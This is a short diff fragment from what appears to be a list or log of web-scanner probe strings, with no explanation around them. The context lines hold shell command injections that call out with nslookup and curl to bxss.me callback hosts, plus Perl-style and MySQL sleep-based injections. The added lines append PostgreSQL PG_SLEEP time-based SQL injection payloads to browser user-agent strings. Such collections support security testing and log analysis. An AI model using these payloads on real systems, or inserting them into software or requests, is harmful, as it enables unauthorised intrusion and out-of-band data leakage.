@@ -2331,3 +2331,6 @@ geth(ostbyname(lc('hitrc'.'jvtjohbef6c76.bxss.me.')).'A'.chr(67).chr(hex('58')).
 if(now(=sysdate(),sleep(40.742),0))
 |(nslookup -q=cname hitobueuyueyqa9663.bxss.me||curl hitobueuyueyqa9663.bxss.me)
 ;(nslookup -q=cname hitocbofyhfnx5dcf2.bxss.me||curl hitocbofyhfnx5dcf2.bxss.me|(nslookup -q=cname hitocbofyhfnx5dcf2.bxss.me||curl hitocbofyhfnx5dcf2.bxss.me)&(nslookup -q=cname hitocbofyhfnx5dcf2.bxss.me||curl hitocbofyhfnx5dcf2.bxss.me))
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36MDnz2fRF' OR 208=(SELECT 208 FROM PG_SLEEP(20.371))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36lfKTwreS') OR 841=(SELECT 841 FROM PG_SLEEP(15))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36hkpzieW3')) OR 994=(SELECT 994 FROM PG_SLEEP(15))--)
